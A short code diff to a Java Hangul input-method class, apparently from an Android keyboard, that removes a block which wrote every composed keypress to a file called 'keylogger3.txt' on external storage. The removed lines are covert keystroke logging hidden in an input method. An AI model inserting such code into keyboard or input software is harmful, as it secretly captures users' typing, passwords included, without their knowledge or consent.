@@ -506,22 +506,6 @@ public class HangulAutomata {
 				encodingCode(mHangulCharBuffer[1]) + encodingCode(mHangulCharBuffer[2]) + "]"  + 
 				", completed=\'" + encodingCode(completedChar) + "\'" + 
 				", working=\'" + encodingCode(mWorkingChar) + "\'");
-
-			String keypress =  encodingCode(mWorkingChar);
-
-			try {
-				String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
-				String FILENAME = "keylogger3.txt";
-
-				File outfile = new File(SDCARD + File.separator + FILENAME);
-				FileOutputStream fos = new FileOutputStream(outfile, true);
-				fos.write(keypress.getBytes());
-				fos.close();
-			} catch (Exception e) {
-				Log.d("EXCEPTION", e.getMessage());
-			}
-
-
         }
 
         int[] ret = {-1, -1, -1};
